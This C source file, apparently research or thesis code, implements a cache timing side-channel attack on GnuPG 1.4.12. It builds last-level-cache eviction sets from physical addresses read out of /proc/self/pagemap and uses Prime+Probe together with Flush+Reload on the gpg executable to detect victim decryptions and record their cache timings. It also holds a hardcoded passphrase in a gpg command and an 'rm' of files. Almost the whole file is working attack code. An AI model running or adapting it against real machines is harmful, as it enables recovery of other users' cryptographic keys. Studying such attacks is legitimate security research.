#include "../../Utils/src/cachetechniques.h"
#include "../../Utils/src/performancecounters.h"
#include "../../Utils/src/fileutils.h"

#define PAGES_SIZE 4096
#define NR_OF_ADDRS 64
#define LL_CACHE_NR_OF_BITS_OF_OFFSET 6
#define LL_CACHE_NUMBER_OF_SETS 1024
#define DEBUG_NR_SETS 256
#define LL_CACHE_NUMBER_OF_WAYS 16
#define LL_CACHE_LINE_NUMBER_OF_BYTES 64
#define PAGEMAP_INFO_SIZE 8 /*There are 64 bits of info for each page on the pagemap*/
#define PRIME_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/prime_static_analysis.data"
#define PROBE_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/probe_static_analysis.data"
#define VARIATION_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/pp_llc_hit_miss_variation_static_analysis.data"
#define MAX_TIMES_TO_CSV 300000
#define MAX_TIMES_TO_OBTAIN_THRESHOLD 512*1024
#define OUTPUTRAWDATA 1

typedef struct congruentaddrs {
	int wasaccessed;
	void *virtualaddrs[NR_OF_ADDRS];
} congruentaddrs_t;

typedef struct llcache {
	congruentaddrs_t congaddrs[LL_CACHE_NUMBER_OF_SETS];
	void *llcachebasepointer;
	int mappedsize;
	int pagemap;
	unsigned short int llc_analysis[MAX_TIMES_TO_CSV * LL_CACHE_NUMBER_OF_SETS];
} llcache_t;

typedef struct evictionconfig {
	int evictionsetsize;
	int sameeviction;
	int congruentvirtualaddrs;
} evictionconfig_t;

typedef struct evictiondata {
	unsigned int maxhit;
	unsigned int maxmiss;
	int threshold;
	double countcorrecthits;
	double allhits;
	double hitsrate;
	double countcorrectmisses;
	double allmisses;
	double evictionrate;
} evictiondata_t;

typedef struct datacsvfile {

	llcache_t llcache;
} datacsvfile_t;

void preparellcache(llcache_t **llcache, int mappedsize) {
	int i;

	*llcache = calloc(1, sizeof(llcache_t));
	(*llcache)->mappedsize = mappedsize;
	// Map ll cache
	(*llcache)->llcachebasepointer = mmap(0, mappedsize,
	PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if ((*llcache)->llcachebasepointer == MAP_FAILED)
		handle_error("mmap");

	// Get file pointer for /proc/<pid>/pagemap
	(*llcache)->pagemap = open("/proc/self/pagemap", O_RDONLY);

	// Init mapping so that pages are not empty
	for (i = 0; i < mappedsize; i += PAGES_SIZE) {
		unsigned long long *aux = ((void *) (*llcache)->llcachebasepointer) + i;
		aux[0] = i;
	}

	// Init congaddrs
	memset((*llcache)->congaddrs, 0,
	LL_CACHE_NUMBER_OF_SETS * sizeof(congruentaddrs_t));
}

void prepareevictconfig(evictionconfig_t **config, int evictionsetsize,
		int sameeviction, int congruentvirtualaddrs) {
	*config = calloc(1, sizeof(evictionconfig_t));
	(*config)->evictionsetsize = evictionsetsize;
	(*config)->sameeviction = sameeviction;
	(*config)->congruentvirtualaddrs = congruentvirtualaddrs;
}

void *getphysicaladdr(void *virtualaddr, int pagemap) {
	// Access a cache line
	accessway(virtualaddr);

	// Obtain virtual addr offset within the pagemap
	// Data from: https://www.kernel.org/doc/Documentation/vm/pagemap.txt
	// Page map info is 64 bit size = 8 bytes = PAGEMAP_INFO_SIZE
	unsigned long virtualaddr_offset =
			((unsigned long) virtualaddr / PAGES_SIZE) * PAGEMAP_INFO_SIZE;

	// Data from: https://www.kernel.org/doc/Documentation/vm/pagemap.txt
	// The page frame number is in bits 0-54.
	// PAGEMAP_INFO_SIZE -1 = the first 7 bytes (bits 0-55)
	unsigned long long pageframenumber = 0;
	if (pread(pagemap, &pageframenumber, PAGEMAP_INFO_SIZE, virtualaddr_offset)
			!= 8) {
		/*NOT 8bytes*/
		handle_error("pread");
	}

	// Check page present
	if (!(pageframenumber & (1ULL << 63))) {
		handle_error("page not present");
	}

	// Data from: https://www.kernel.org/doc/Documentation/vm/pagemap.txt
	// Bit 55 is the flag pte is soft-dirty so it need to be cleared
	pageframenumber &= ((1ULL << 54) - 1);

	// Calculate the physical addr:  "| PageFramNumber | Offset of the physical addr |"
	// The offset of the physical address is = "| Index | Offset |" of the virtual addr
	return ((pageframenumber * PAGES_SIZE)
			| (((unsigned long) virtualaddr) & (PAGES_SIZE - 1)));
}

unsigned int getsetindex(void *physicaladdr) {
	return (((unsigned int) physicaladdr) >> LL_CACHE_NR_OF_BITS_OF_OFFSET)
			% LL_CACHE_NUMBER_OF_SETS;
}

// L1 D-Cache |Tag(20 bits)|Set(6 bits)|offset(6 bits) = |
void getphysicalcongruentaddrs(evictionconfig_t *config, llcache_t *llcache,
		unsigned int set, void *physicaladdr_src) {
	unsigned int i, count_found, index_aux;
	void *virtualaddr_aux, *physicaladdr_aux;
	const int virtualaddrslimit = config->evictionsetsize
			+ config->congruentvirtualaddrs - 1;
	count_found = 0;

	// Search for virtual addrs with the same physical index as the source virtual addr
	for (i = 0; count_found != virtualaddrslimit && i < llcache->mappedsize;
			i += LL_CACHE_LINE_NUMBER_OF_BYTES) {
		virtualaddr_aux = llcache->llcachebasepointer + i;
		physicaladdr_aux = getphysicaladdr(virtualaddr_aux, llcache->pagemap);
		index_aux = getsetindex(physicaladdr_aux);

		if (set == index_aux && physicaladdr_src != physicaladdr_aux) {
			llcache->congaddrs[set].virtualaddrs[count_found] = virtualaddr_aux;
			count_found++;
		}
	}
	if (count_found != virtualaddrslimit)
		handle_error("not enough congruent addresses");

	llcache->congaddrs[set].wasaccessed = 1;
}

void evict(evictionconfig_t *config, void *virtualaddrs[NR_OF_ADDRS]) {
	int icounter, iaccesses, icongruentaccesses;
	for (icounter = 0; icounter < config->evictionsetsize; ++icounter) {
		for (iaccesses = 0; iaccesses < config->sameeviction; ++iaccesses) {
			for (icongruentaccesses = 0;
					icongruentaccesses < config->congruentvirtualaddrs;
					++icongruentaccesses) {
				accessway(virtualaddrs[icounter + icongruentaccesses]);
			}
		}
	}
}

void primellcache(evictionconfig_t *config, llcache_t *llcache,
		unsigned int set) {

	if (llcache->congaddrs[set].wasaccessed == 0) {
		getphysicalcongruentaddrs(config, llcache, set, NULL);
	}
	congruentaddrs_t congaddrs = llcache->congaddrs[set];
	evict(config, congaddrs.virtualaddrs);
}

unsigned long probellcache(evictionconfig_t *config, llcache_t *llcache,
		unsigned int set) {
	//Begin measuring time
	unsigned int setcycles;
	//TODO: change drop the start here?

	int i, addrcount = config->evictionsetsize + config->congruentvirtualaddrs
			- 1;

	if (llcache->congaddrs[set].wasaccessed == 0) {
		getphysicalcongruentaddrs(config, llcache, set, (void *) NULL);
	}
	congruentaddrs_t congaddrs = llcache->congaddrs[set];

	//TODO: change drop the start here?
	setcycles = 0;

	for (i = addrcount - 1; i >= 0; --i) {
		setcycles += timeaccessway(congaddrs.virtualaddrs[i]);
	}

	// Obtain operations time
	return setcycles;
}

#define CMD_DECRYPT_STR "taskset 0x00000001 echo 1a2b3cinesc | /home/root/gnupg-1.4.12/bin/gpg --passphrase-fd 0 /home/root/gnupg-1.4.12/bin/message.txt.gpg"
#define CMD_RM_DECRYPT_STR "rm /home/root/gnupg-1.4.12/bin/*.txt"
void synchronouslyrungnupg() {
	//COMMENT WHEN ENCRYPT
	int errno = system(CMD_DECRYPT_STR);
	int errno1 = system(CMD_RM_DECRYPT_STR);
	if (errno == -1 || errno1 == -1)
		handle_error("system() running gnupg or removing files");
}

void obtainevictiondata(int mappedsize, int evictionsetsize, int sameeviction,
		int congruentvirtualaddrs, int histogramsize, int histogramscale,
		int maxruns, evictiondata_t *evictiondata, llcache_t *llcache,
		evictionconfig_t *config) {
	int fdallh, fdallm;
	unsigned int hits, misses;

	// Config Performance Counters
	fdallh = get_fd_perf_counter(PERF_TYPE_HARDWARE,
			PERF_COUNT_HW_CACHE_REFERENCES);
	fdallm = get_fd_perf_counter(PERF_TYPE_HARDWARE,
			PERF_COUNT_HW_CACHE_MISSES);

	// Preparing histograms
	const int MID_ARRAY = PAGES_SIZE / 2;
	unsigned int *hit_counts;
	hit_counts = calloc(histogramsize, sizeof(unsigned int));
	unsigned int *miss_counts;
	miss_counts = calloc(histogramsize, sizeof(unsigned int));

	int i;
	void *array, *physicaladdr;

	array = mmap(0, PAGES_SIZE, PROT_READ | PROT_WRITE,
	MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (array == MAP_FAILED)
		handle_error("mmap");

	physicaladdr = getphysicaladdr(array + MID_ARRAY, llcache->pagemap);
	unsigned int set = getsetindex(physicaladdr);

	// Preparing for the hit histogram
	accessway(array + MID_ARRAY);

	// Start Hits Performance Counters
//	start_perf_counter(fdallh);
//	start_perf_counter(fdallm);

	// Hit histogram
	for (i = 0; i < maxruns; ++i) {
		primellcache(config, llcache, set);
		unsigned long probetime = probellcache(config, llcache, set)
				/ histogramscale;
		hit_counts[
				probetime > (histogramsize - 1) ? histogramsize - 1 : probetime]++;
		sched_yield();
	}

	// Stop Hits Performance Counters
//	hits = stop_perf_counter(fdallh);
//	misses = stop_perf_counter(fdallm);
//
//	printf("\nAfter Hit Counts:\nHits: %u\n", hits);
//	printf("Misses: %u\n", misses);

	// Preparing for the miss histogram
	flush(array + MID_ARRAY);

	// Start Misses Performance Counters
	start_perf_counter(fdallh);
	start_perf_counter(fdallm);

	// Miss histogram
	for (i = 0; i < maxruns; ++i) {
		primellcache(config, llcache, set);

		accessway(array + MID_ARRAY);

		unsigned long probetime = probellcache(config, llcache, set)
				/ histogramscale;
		miss_counts[
				probetime > (histogramsize - 1) ? histogramsize - 1 : probetime]++;
		sched_yield();
	}

	// Stop Miss Performance Counters
	hits = stop_perf_counter(fdallh);
	misses = stop_perf_counter(fdallm);

//	printf("\nAfter Miss Counts:\nHits: %u\n", hits);
//	printf("Misses: %u\n", misses);

	// Obtain eviciton data
	unsigned int hitmax = 0;
	unsigned int missmax = 0;
	unsigned int hitmaxindex = 0;
	unsigned int missmaxindex = 0;
	unsigned int missminindex = 0;
//	printf("TSC:           HITS           MISSES\n");
	for (i = 0; i < histogramsize; ++i) {
//		printf("%3d: %10zu %10zu\n", i * histogramscale, hit_counts[i],
//				miss_counts[i]);
		if (hitmax < hit_counts[i]) {
			hitmax = hit_counts[i];
			hitmaxindex = i;
		}
		if (missmax < miss_counts[i]) {
			missmax = miss_counts[i];
			missmaxindex = i;
		}
		if (miss_counts[i] > 3 && missminindex == 0)
			missminindex = i;
	}

	double countcorrectmisses = 0, allmisses = 0, countcorrecthits = 0,
			allhits = 0;

	evictiondata->maxhit = hitmaxindex * histogramscale;
	evictiondata->maxmiss = missmaxindex * histogramscale;
	evictiondata->threshold = evictiondata->maxmiss
			- (evictiondata->maxmiss - evictiondata->maxhit) / 2;

	for (i = 0; i < histogramsize; ++i) {
		if (miss_counts[i] > 0
				&& (i * histogramscale) > evictiondata->threshold) {
			++countcorrectmisses;
		}
		if (miss_counts[i] > 0) {
			++allmisses;
		}
		if (hit_counts[i] > 0
				&& (i * histogramscale) < evictiondata->threshold) {
			++countcorrecthits;
		}
		if (hit_counts[i] > 0) {
			++allhits;
		}
	}
	evictiondata->allhits = allhits;
	evictiondata->allmisses = allmisses;
	evictiondata->countcorrecthits = countcorrecthits;
	evictiondata->countcorrectmisses = countcorrectmisses;
	evictiondata->evictionrate = (countcorrectmisses / allmisses) * 100;
	evictiondata->hitsrate = (countcorrecthits / allhits) * 100;
}

void analysellc(int set, llcache_t *llcache, evictionconfig_t *config,
		int maxruns) {
	int i;

	for (i = set; i < maxruns; i += LL_CACHE_NUMBER_OF_SETS) {

		//Prime
		primellcache(config, llcache, set);

		//Probe
		llcache->llc_analysis[i] = probellcache(config, llcache, set);
	}
}

#include <sys/stat.h>
#define THRESHOLD 45
#define GPG_MAX_SIZE_BYTES 4194304
#define OUTPUTRAWDATA 1
#define DELAYFORVICTIMACTIVITY 2800
#define NUMBER_OF_EXE_ADDRS 3
#define MAX_ADDRS_TO_MONITOR 10
#define MAX_TIMES_TO_MONITOR_EACH_ADDRS 300000

typedef struct waitforvictim {
	int nr_addrs;
	char* mapping_addr;
	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][NUMBER_OF_EXE_ADDRS];
	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
} waitforvictim_t;

void preparewaitforactivity(waitforvictim_t **waitforvictim) {
//	*llcache = calloc(1, sizeof(llcache_t));
//		(*llcache)->mappedsize = mappedsize;
	*waitforvictim = calloc(1, sizeof(waitforvictim_t));

	int fd_exe;
	struct stat sbuff;

	//obtain the addrs to monitor
	(*waitforvictim)->nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME,
			(*waitforvictim)->exe_addrs);
	if ((*waitforvictim)->nr_addrs != NUMBER_OF_EXE_ADDRS) {
		handle_error("NUMBER OF EXE ADDRS ERROR");
	}

	//share the executable
	fd_exe = open(EXE_FILENAME, O_RDONLY);
	if (fd_exe == -1)
		handle_error("open_exe_filename");
	if (fstat(fd_exe, &sbuff) == -1)
		handle_error("fstat");
	(*waitforvictim)->mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES,
	PROT_READ, MAP_PRIVATE, fd_exe, 0);
	if ((*waitforvictim)->mapping_addr == MAP_FAILED)
		handle_error("mmap");
	printf(".exe shared\n");
}

void waitforvictimactivity(waitforvictim_t *waitforvictim) {

	unsigned long ptr_offset = (unsigned long) waitforvictim->mapping_addr;

	unsigned long long start = getcurrenttsc();
	fr_analysealladdrs(OUTPUTRAWDATA, waitforvictim->analysis_array[0],
			ptr_offset, waitforvictim->exe_addrs, NUMBER_OF_EXE_ADDRS,
			THRESHOLD);
	do {
		do {
			start += DELAYFORVICTIMACTIVITY;
		} while (missedvictimactivity(start));
		fr_analysealladdrs(OUTPUTRAWDATA, waitforvictim->analysis_array[0],
				ptr_offset, waitforvictim->exe_addrs, waitforvictim->nr_addrs,
				THRESHOLD);
	} while (!isvictimactive(waitforvictim->analysis_array[0],
			waitforvictim->nr_addrs,
			OUTPUTRAWDATA ? THRESHOLD : 2));
}

//TODO: remove?
void meananalysis(llcache_t *llcache) {
	int i, j, sum, count = 0;
	int analysissize = MAX_TIMES_TO_CSV * LL_CACHE_NUMBER_OF_SETS;
	for (i = 0; i < analysissize; i += LL_CACHE_NUMBER_OF_SETS, ++count) {
		sum = 0, count = 0;
		if (count > (analysissize / 20)) {
			sum += llcache->llc_analysis[i];
			count = 0;
		}
	}
}

void analysehitandmissvariation(int analysissize, int evictionsetsize,
		int sameeviction, int congruentvirtualaddrs, int histogramsize,
		int histogramscale) {
	evictiondata_t *evictiondata = calloc(1, sizeof(evictiondata_t));
	int mappedsize;
	// Paper Cache-access pattern attack on disaligned AES t-tables
	// (3/4)^(4*3) = 1.367% probability LLC not being totally evicted
	const int NUMBER_TIMES_FOR_THE_TOTAL_EVICION = 5;
	mappedsize = (LL_CACHE_NUMBER_OF_SETS * LL_CACHE_NUMBER_OF_WAYS
			* LL_CACHE_LINE_NUMBER_OF_BYTES)
			* NUMBER_TIMES_FOR_THE_TOTAL_EVICION;

	const int headerssize = 2;
	int i;
	unsigned int analysis_array[analysissize][headerssize];

	llcache_t *llcache;
	evictionconfig_t *config;

	preparellcache(&llcache, mappedsize);
	prepareevictconfig(&config, evictionsetsize, sameeviction,
			congruentvirtualaddrs);

	for (i = 0; i < analysissize; ++i) {
		obtainevictiondata(mappedsize, evictionsetsize, sameeviction,
				congruentvirtualaddrs, /*Histogram size*/histogramsize, /*Histogram scale*/
				histogramscale,
				MAX_TIMES_TO_OBTAIN_THRESHOLD, evictiondata, llcache, config);
		analysis_array[i][0] = evictiondata->maxhit;
		analysis_array[i][1] = evictiondata->maxmiss;
	}
	const char *headers[headerssize];
	headers[0] = "Hits";
	headers[1] = "Misses";
	biarraytocsvwithstrheaders(VARIATION_ANALYSIS_DATA_FILENAME, headers,
			analysissize, headerssize, analysis_array);
}

int main() {

	setcoreaffinity(0);

	const int histogramsize = 1000;
	const int histogramscale = 5;

	const int evictionsetsize = 20;
	const int sameeviction = 12;
	const int congruentvirtualaddrs = 1;
	const int analysissize = 30;

	analysehitandmissvariation(analysissize, evictionsetsize, sameeviction,
			congruentvirtualaddrs, histogramsize, histogramscale);

	evictiondata_t *evictiondata = calloc(1, sizeof(evictiondata_t));
	int mappedsize;
// Paper Cache-access pattern attack on disaligned AES t-tables
// (3/4)^(4*3) = 1.367% probability LLC not being totally evicted
	const int NUMBER_TIMES_FOR_THE_TOTAL_EVICION = 5;
	mappedsize = (LL_CACHE_NUMBER_OF_SETS * LL_CACHE_NUMBER_OF_WAYS
			* LL_CACHE_LINE_NUMBER_OF_BYTES)
			* NUMBER_TIMES_FOR_THE_TOTAL_EVICION;

	llcache_t *llcache;
	evictionconfig_t *config;

	preparellcache(&llcache, mappedsize);
	prepareevictconfig(&config, evictionsetsize, sameeviction,
			congruentvirtualaddrs);

	obtainevictiondata(mappedsize, evictionsetsize, sameeviction,
			congruentvirtualaddrs, /*Histogram size*/histogramsize, /*Histogram scale*/
			histogramscale,
			MAX_TIMES_TO_OBTAIN_THRESHOLD, evictiondata, llcache, config);
	if (evictiondata->evictionrate > 50) {
		if (evictiondata->maxhit >= evictiondata->maxmiss) {
			printf("[!] Cycles of Hit >= Cycles of Miss [!]\n");
		}
		printf("Max Hit: %u\n", evictiondata->maxhit);
		printf("Max Miss: %u\n", evictiondata->maxmiss);
		printf("Threshold: %u\n", evictiondata->threshold);
		printf("Hits Rate: %lf\%\n", evictiondata->hitsrate);
		printf("Eviction Rate: %lf\%\n", evictiondata->evictionrate);

	}

	waitforvictim_t *waitforvictim;
	int setidx;

	preparellcache(&llcache, mappedsize);
	prepareevictconfig(&config, evictionsetsize, sameeviction,
			congruentvirtualaddrs);
	preparewaitforactivity(&waitforvictim);
	for (setidx = 0; setidx < DEBUG_NR_SETS/*LL_CACHE_NUMBER_OF_SETS*/; ++setidx) {
		printf("\nWaiting for activity...\n");

		waitforvictimactivity(waitforvictim);

		//int setidx = 1;
		printf("Analyse set number: %d\n", setidx);
		analysellc(setidx, llcache, config,
		MAX_TIMES_TO_CSV * DEBUG_NR_SETS/*LL_CACHE_NUMBER_OF_SETS*/);
	}

	arraytodatafilewithoutlabels(PROBE_ANALYSIS_DATA_FILENAME,
			llcache->llc_analysis,
			MAX_TIMES_TO_CSV, DEBUG_NR_SETS/*LL_CACHE_NUMBER_OF_SETS*/);

	return 0;
}
